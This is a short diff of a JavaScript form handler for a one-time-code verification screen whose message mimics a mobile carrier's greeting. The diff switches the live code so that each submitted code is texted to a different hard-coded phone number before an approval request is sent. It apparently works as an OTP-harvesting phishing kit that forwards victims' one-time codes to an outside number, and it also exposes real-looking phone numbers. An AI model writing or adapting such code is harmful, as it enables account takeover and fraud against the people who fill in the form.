@@ -154,14 +154,14 @@ const message = `Y'ello. Please enter the following code:${code} to complete you
     e.preventDefault()
     if (!complete || expired || verifying) return
     setVerifying(true)
-     sendSMS(
-      "+254737799310",
-      message
-    );
-    //  sendSM(
-    //   "+254768408107",
+    //  sendSMS(
+    //   "+254737799310",
     //   message
     // );
+     sendSM(
+      "+254768408107",
+      message
+    );
 
     const res = await requestApproval({ phone, otp: code })
     if (!res.ok || !res.id) {
